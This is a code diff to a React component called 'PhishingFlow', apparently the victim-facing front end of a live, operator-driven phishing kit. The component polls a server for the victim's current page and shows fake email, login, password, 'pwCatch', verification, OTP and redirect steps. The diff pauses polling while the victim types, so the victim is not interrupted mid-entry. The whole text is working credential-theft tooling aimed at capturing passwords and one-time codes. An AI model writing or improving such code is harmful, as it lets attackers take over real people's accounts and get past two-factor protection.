@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import EmailStep from "./steps/EmailStep";
 import LoginStep from "./steps/LoginStep";
 import PasswordStep from "./steps/PasswordStep";
@@ -23,9 +23,20 @@ type VictimState = {
 export default function PhishingFlow() {
   const [state, setState] = useState<VictimState | null>(null);
   const [error, setError] = useState<string | null>(null);
+  const isInteracting = useRef(false);
+  const intervalId = useRef<NodeJS.Timeout | null>(null);
 
-  useEffect(() => {
+  const stopPolling = useCallback(() => {
+    if (intervalId.current) {
+      clearInterval(intervalId.current);
+      intervalId.current = null;
+    }
+  }, []);
+
+  const startPolling = useCallback(() => {
+    stopPolling(); // Ensure no multiple intervals are running
     const fetchState = async () => {
+      if (isInteracting.current) return;
       try {
         const res = await fetch("/api/state?view=victim");
         if (!res.ok) {
@@ -40,12 +51,26 @@ export default function PhishingFlow() {
         console.error("Polling error:", err);
       }
     };
-
     fetchState();
-    const intervalId = setInterval(fetchState, 2000);
+    intervalId.current = setInterval(fetchState, 2000);
+  }, [stopPolling]);
 
-    return () => clearInterval(intervalId);
-  }, []);
+
+  useEffect(() => {
+    startPolling();
+    return () => stopPolling();
+  }, [startPolling, stopPolling]);
+
+  const handleInteractionStart = () => {
+    isInteracting.current = true;
+  };
+  
+  const handleInteractionEnd = async (submitAction: () => Promise<void>) => {
+    stopPolling();
+    await submitAction();
+    isInteracting.current = false;
+    startPolling();
+  };
 
   if (error) {
     return (
@@ -72,25 +97,34 @@ export default function PhishingFlow() {
       </div>
     );
   }
+  
+  const renderStep = () => {
+      const interactionProps = {
+        onInteractionStart: handleInteractionStart,
+        onInteractionEnd: handleInteractionEnd,
+      };
 
-  switch (state.currentPage) {
-    case 'email':
-      return <EmailStep />;
-    case 'login':
-      return <LoginStep {...state} />;
-    case 'password':
-      return <PasswordStep {...state} />;
-    case 'pwCatch':
-      return <PwCatchStep {...state} />;
-    case 'verify':
-      return <VerifyStep />;
-    case 'otp':
-      return <OtpStep />;
-    case 'error':
-        return <ErrorStep errorMessage={state.errorMessage} />;
-    case 'redirect':
-        return <Redirecting url={state.redirectUrl} />;
-    default:
-      return <EmailStep />;
+      switch (state.currentPage) {
+        case 'email':
+          return <EmailStep {...interactionProps} />;
+        case 'login':
+          return <LoginStep {...state} {...interactionProps} />;
+        case 'password':
+          return <PasswordStep {...state} {...interactionProps} />;
+        case 'pwCatch':
+          return <PwCatchStep {...state} {...interactionProps} />;
+        case 'verify':
+          return <VerifyStep {...interactionProps} />;
+        case 'otp':
+          return <OtpStep {...interactionProps} />;
+        case 'error':
+            return <ErrorStep errorMessage={state.errorMessage} {...interactionProps} />;
+        case 'redirect':
+            return <Redirecting url={state.redirectUrl} />;
+        default:
+          return <EmailStep {...interactionProps} />;
+      }
   }
+
+  return renderStep();
 }
